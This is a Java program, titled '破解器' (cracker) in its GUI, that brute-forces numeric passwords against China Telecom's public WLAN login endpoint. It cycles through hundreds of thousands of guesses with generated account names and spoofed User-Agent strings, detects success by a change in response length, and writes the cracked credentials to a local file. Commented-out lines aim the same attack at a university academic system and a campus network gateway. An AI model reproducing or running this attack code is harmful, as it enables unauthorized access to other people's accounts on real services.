import java.awt.Font;
import java.awt.TextArea;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;

import javax.swing.JFrame;

public class webfangwen {
	static int lenth = 0;
	static int lenthf = 0;

	static public void main(String[] a) {
		
			Backstage bs = new Backstage();
			new Thread(bs).start();//
			int max=900000;
			int min=303818;
			//min=240091;//242731
			int Tnum=1;
			for(int i=0;i<Tnum;i++)
			{
				
				fangwen f=new fangwen("",min+i*(max-min)/Tnum,min+(i+1)*(max-min)/Tnum  );
				new Thread(f).start();//
				
				
			}
			
			
		}
	}

/////////////////////////////////////////////
class fangwen implements Runnable {

	String url;
	int startpwd;
	int endpwd;
	
	public fangwen(String u, int s, int e) {
		url = u;
		startpwd = s;
		endpwd = e;
	}

	String getChinanetUrlOther(String otherUser,String pwd)
	{
		String url = null;
		String basIp = "";
		String userIp ="";
		
		InetAddress addr = null;
		try {
			addr = InetAddress.getLocalHost();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		userIp=addr.getHostAddress().toString();//获得本机IP
		String oraUrl = "";
		String regArea = "zj";
		
		url="https://wlan.ct10000.com/v0400/web/other/login?"
				+"commonUser="+otherUser+"&commonUserPwd="+pwd + "&regArea=" + regArea 
				+ "&userIp=" + userIp + "&basIp=" + basIp + "&oraUrl=" + oraUrl;
		
		return url;
	}
	String getChinanetUrlPhone(String phoneNbr,String pwd)
	{
		String url = null;
		String universities = "false";
		String basIp = "";
		String userIp ="";
		
		InetAddress addr = null;
		try {
			addr = InetAddress.getLocalHost();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		userIp=addr.getHostAddress().toString();//获得本机IP

		String oraUrl = "";
		url = "https://wlan.ct10000.com/v0400/web/phone/login?"
				+ "phone=" + phoneNbr + "&pwd=" + pwd
				+ "&universities=" + universities + "&userIp=" + userIp
				+ "&basIp=" +
				basIp + "&oraUrl=" + oraUrl;
		
		return url;
	}
	@Override
	public void run() {
		// TODO Auto-generated method stub
		int lenth=0;
		int lentht=0;//前一个
		String temppwd;
		String tempzh;
		for (int i = startpwd; i < endpwd; i++) {
			
			String bower="Mozilla/4.0 (compatible; MSIE 6.0; Windows 7)";
			if(i%2==0)
				bower="Mozilla/5.0 (compatible; MSIE 6.0; Windows xp)";
			 String zjh="00947030";
			 String mm=""+i;
			// url1="http://jwxt.imu.edu.cn/loginAction.do?zjh="+zjh+"&mm="+mm;
			//url1="http://www.flagnet.net/";
			 // url1="http://10.1.1.2/php/user_cmd.php?loginuser=00947084&password="+i+"";
			// url1="http://10.1.1.2/php/user_login.php?password=199&loginuser=00947084&domainid=1&logintype=查看详情&refer=http://10.1.1.2/php/onlinestatus.php?logout_offnet=1";
			 //String url1="http://202.207.12.42/";
			String phoneNbr = "18925781539";
			String pwd = ""+i;
			String otherUser = "hzhz"+i;
			String url1=getChinanetUrlOther(otherUser, pwd);
			String logouturl="https://wlan.ct10000.com/v0400/web/logout?Enc=7EECB9FF6DCD10ADCFE562EC5E517FCD" +
					"BA0A8DA7522B236CEC46FEB72969E39D9ADB603BA5E4EAD93D83A30" +
					"1D33087D3F642435B7E865FF3F53A381A812C036AA1711A468F9C594284833C" +
					"F9BFE7DD3E58A1681B77380EC9A85BD4C797DE11B8BB9DE3DA7E55D2A0E44EC20FA40DAD48";
			//begin(logouturl) ;//连接	
			if(i==startpwd)
			{
				lenth=lentht=begin(url1,bower) ;
				Backstage.showlenth( "文件大小"+lenth );
			}else
			{
				lentht=lenth;
				lenth=begin(url1,bower) ;//连接				
			}
			temppwd=pwd;
			tempzh=otherUser;
			if(lenth!=lentht)
			//if(lenth==329)
			{
				Backstage.showright( "账号"+tempzh+"\n正确密码"+temppwd );
				Backstage.showlenth( "文件大小"+lenth );
				new WriteFile().Appendfile("\r\n账号"+tempzh+"正确密码"+temppwd+"\r\n");
				begin(logouturl,bower) ;//连接		
				lenth=lentht;
				//return;
			}
			Backstage.showInf( "当前密码:"+pwd );
			try {
				Thread.sleep(1);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
	}

	public int begin(String urlStr, String bower) 
	{
		System.out.println(urlStr);
		
		int lenth=0;
		int chByte = 0;
		URL url = null;
		HttpURLConnection httpConn = null;
		InputStream in = null;
		try {
			url = new URL(urlStr);
			httpConn = (HttpURLConnection) url.openConnection();
			HttpURLConnection.setFollowRedirects(true);
			httpConn.setRequestMethod("POST");
			
			httpConn.setRequestProperty("User-Agent",bower);
			// logger.info(httpConn.getResponseMessage());
			in = httpConn.getInputStream();
			// out = new FileOutputStream(new File(outPath));
			chByte = in.read();
			int i = 0;
			while (chByte != -1) {
				i++;
				// out.write(chByte);
				chByte = in.read();
			}
			lenth=i;

		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				// out.close();
				in.close();
				httpConn.disconnect();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		
		return lenth;
	}

}

///////////////////////////////////////////////////
class Backstage implements Runnable
{
	
	static JFrame bstage;
	static TextArea zhuangtai=new TextArea();
	static TextArea zhuangtai2=new TextArea();
	static TextArea zhuangtai3=new TextArea();
	static int cnum=0;
	static String inf;

	public Backstage()
	{
		
	}
	
	public synchronized static void showright(String in)
	{
		
		zhuangtai2.append(in+"\n");
	}
	public synchronized static void showlenth(String in)
	{
		
		zhuangtai3.append(in+"\n");
	}
	public synchronized static void showInf(String in)
	{
		inf=in;
		zhuangtai.append(inf+"\n");
	}
	public synchronized static void showInf(int  in)
	{
		inf=""+in;
		zhuangtai.append(inf+"\n");
	}
	@Override
	public void run() {
		// TODO Auto-generated method stub
		CreateWindow();
		Backstage.showInf("密码破解");
		
		
	}
	public boolean CreateWindow()
	{
		// 创建JFrame对象，初始不可见
				bstage=new JFrame("破解器");// 调用父类的构造方法
				bstage.setLayout(null);
				zhuangtai = new TextArea("服务器状态\n");
				zhuangtai.setBounds(50,50,200,600);
				
				zhuangtai2 = new TextArea("服务器状态\n");
				zhuangtai2.setBounds(280,50,200,400);
				
				zhuangtai3 = new TextArea("服务器状态\n");
				zhuangtai3.setBounds(280,500,200,100);
				////////////////////////////////
				zhuangtai.setFont(new Font("黑体",Font.CENTER_BASELINE,15));
				bstage.add(zhuangtai);

				zhuangtai2.setFont(new Font("黑体",Font.CENTER_BASELINE,15));
				bstage.add(zhuangtai2);
				
				zhuangtai3.setFont(new Font("黑体",Font.CENTER_BASELINE,15));
				bstage.add(zhuangtai3);
				//bstage.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);// 设置框架关闭按钮事件
				bstage.pack();         // 压缩框架的显示区域
				bstage.setBounds(0,0,1000,700);
				bstage.setVisible(true); 	
				zhuangtai.setEditable(false);
				zhuangtai2.setEditable(false);
				zhuangtai3.setEditable(false);
				//bstage.setExtendedState(JFrame.MAXIMIZED_BOTH);
				return true;
	}
			
}



////////////////////////////////////
class WriteFile {
	 
	 public void  Appendfile(String text){
	  String s = new String();
	  String s1 = new String();
	  try {
	   File f = new File("D:\\a.txt");
	   if(f.exists()){
	    System.out.print("文件存在");
	   }else{
	    System.out.print("文件不存在");
	    f.createNewFile();//不存在则创建
	   }
	   BufferedReader input = new BufferedReader(new FileReader(f));
	   
	   while((s = input.readLine())!=null){
	    s1 += s+"\n";
	   }
	   System.out.println(s1);
	   input.close();
	   s1 +=text;
	   
	   BufferedWriter output = new BufferedWriter(new FileWriter(f));
	   output.write(s1);
	   output.close();
	  } catch (Exception e) {
	   e.printStackTrace();
	  }
	 }
	 
	}